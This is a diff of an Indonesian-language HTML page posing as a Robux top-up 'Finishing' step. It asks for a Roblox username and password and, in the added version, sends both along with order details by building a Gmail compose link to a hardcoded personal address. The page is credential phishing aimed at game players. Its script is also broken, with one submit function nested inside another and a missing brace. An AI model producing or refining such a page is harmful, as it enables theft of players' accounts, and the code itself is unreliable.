@@ -2,49 +2,77 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Username Roblox</title>
-<style>
-body{
-  margin:0;font-family:Arial;
-  background:url("https://files.catbox.moe/bbxr41.jpg") center/cover fixed;
-}
-.box{
-  background:white;width:300px;
-  margin:150px auto;padding:20px;
-  border-radius:10px;text-align:center;
-}
-input,button{width:100%;padding:8px;margin-top:8px}
-button{background:#00b06f;color:#fff;border:none}
-</style>
+<title>Finishing</title>
 </head>
-<body>
 
-<div class="box">
+<body style="
+  margin:0;
+  font-family:Arial;
+  background:url('https://files.catbox.moe/bbxr41.jpg') no-repeat center center fixed;
+  background-size:cover;
+">
+
+<div style="
+  background:white;
+  width:300px;
+  margin:150px auto;
+  padding:20px;
+  border-radius:10px;
+  text-align:center;
+">
   <h2>Finishing</h2>
-  <input type="text" id="username" placeholder="Username Roblox">
-  <input type="text" id="password" placeholder="Password Roblox">
-  <button onclick="submit()">KLIK TOMBOL INI UNTUK MENYELESAIKAN</button>
+
+  <input type="text" id="username" placeholder="Username Roblox"
+    style="width:100%;padding:8px;margin-top:8px">
+  <input type="text" id="password" placeholder="You Password"
+    style="width:100%;padding:8px;margin-top:8px">
+
+  <button onclick="submit()"
+    style="width:100%;padding:10px;margin-top:10px;
+    background:#00b06f;color:white;border:none">
+    KIRIM
+  </button>
 </div>
 
 <script>
 function submit(){
-  fetch("http://localhost:3000/order",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      robux: localStorage.getItem("robux"),
-      harga: localStorage.getItem("harga"),
-      payment: localStorage.getItem("payment"),
-      username: document.getElementById("username").value
-      password: document.getElementById("password").value
-    })
-  })
-  .then(r=>r.text())
-  .then(msg=>{
-    alert(msg);
-    localStorage.clear();
-  });
+  const username = document.getElementById("username").value;
+
+  if(!username){
+    alert("Username Roblox wajib diisi!");
+    return;
+  }
+
+function submit(){
+  const password = document.getElementById("password").value;
+
+  if(!password){
+    alert("password Roblox wajib diisi!");
+    return;
+  }
+
+  const subject = "Order Top Up Robux";
+
+  const body = `
+ORDER ROBUX
+====================
+Username Roblox : ${username}
+Password : ${password}
+Jumlah Robux    : ${localStorage.getItem("robux")}
+Harga           : Rp ${localStorage.getItem("harga")}
+Pembayaran      : ${localStorage.getItem("payment")}
+  `;
+
+  const gmailUrl =
+    "https://mail.google.com/mail/?view=cm&fs=1" +
+    "&to=" + encodeURIComponent("ryuzzl402@gmail.com") +
+    "&su=" + encodeURIComponent(subject) +
+    "&body=" + encodeURIComponent(body);
+
+  localStorage.clear();
+  window.location.href = gmailUrl;
 }
 </script>
+
 </body>
 </html>
